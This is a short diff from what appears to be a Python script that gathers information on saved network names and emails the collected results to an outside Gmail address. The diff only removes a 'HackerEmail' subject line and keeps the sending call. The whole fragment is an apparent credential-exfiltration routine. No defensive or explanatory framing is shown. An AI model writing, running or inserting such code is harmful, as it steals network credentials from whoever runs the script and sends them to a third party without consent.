@@ -23,4 +23,4 @@ for network_name in network_names_list:
     result += current_result
 
 print(result)
-send_male(" wejhoon@gmail.com","HackerEmail",result)
+send_male(" wejhoon@gmail.com","",result)
